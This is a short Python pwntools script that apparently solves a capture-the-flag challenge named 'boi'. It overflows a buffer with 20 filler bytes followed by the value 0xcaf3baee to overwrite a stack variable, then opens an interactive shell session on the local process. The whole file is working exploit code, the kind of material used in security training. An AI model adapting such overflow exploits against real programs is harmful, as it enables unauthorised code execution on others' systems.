#!/usr/bin/env python
from pwn import *

target = process("./boi")
payload = b"A"*20+ p32(0xcaf3baee)

target.send(payload)
target.interactive()
